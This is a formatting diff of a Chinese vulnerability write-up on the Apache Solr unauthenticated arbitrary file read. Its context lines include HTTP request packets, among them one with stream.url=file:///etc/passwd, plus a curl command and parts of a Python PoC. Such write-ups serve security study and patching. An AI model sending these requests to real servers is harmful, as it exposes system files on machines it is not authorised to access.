@@ -6,8 +6,8 @@ Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情�
 
 参考链接：
 
-- Apache Solr 组件安全概览 https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 
-- https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ
+* Apache Solr 组件安全概览 https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
+* https://mp.weixin.qq.com/s/HMtAz6\_unM1PrjfAzfwCUQ
 
 ## 漏洞影响
 
@@ -25,23 +25,23 @@ title="Solr Admin"
 
 访问 Solr Admin 管理员页面
 
-![image-20220209120847764](images/202202091208853.png)
+![image-20220209120847764](../.gitbook/assets/202202091208853.png)
 
 获取core的信息
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json
 ```
 
-![image-20220209120905965](images/202202091209053.png)
+![image-20220209120905965](../.gitbook/assets/202202091209053.png)
 
 发送请求
 
-![image-20220209120921295](images/202202091209396.png)
+![image-20220209120921295](../.gitbook/assets/202202091209396.png)
 
 请求包如下
 
-```plain
+```
 POST /solr/ckan/config HTTP/1.1
 Host: xxx.xxx.xxx:8983
 Content-Length: 99
@@ -61,11 +61,11 @@ Connection: close
 
 再进行文件读取
 
-![image-20220209120956306](images/202202091209408.png)
+![image-20220209120956306](../.gitbook/assets/202202091209408.png)
 
 请求包如下
 
-```plain
+```
 POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
 Host: xxx.xxx.xxx.xxx:8983
 Content-Length: 29
@@ -83,9 +83,7 @@ Connection: close
 stream.url=file:///etc/passwd
 ```
 
-
-
-![image-20220209121017516](images/202202091210638.png)
+![image-20220209121017516](../.gitbook/assets/202202091210638.png)
 
 Curl请求为
 
@@ -99,7 +97,7 @@ curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "s
 
 poc1：
 
-- POC还是建立在未授权访问的情况下
+* POC还是建立在未授权访问的情况下
 
 ```python
 import requests
@@ -170,7 +168,7 @@ if __name__ == '__main__':
         POC_3(target_url, core_name, File_name)
 ```
 
-![image-20220209121044117](images/202202091210263.png)
+![image-20220209121044117](../.gitbook/assets/202202091210263.png)
 
 poc2：
 
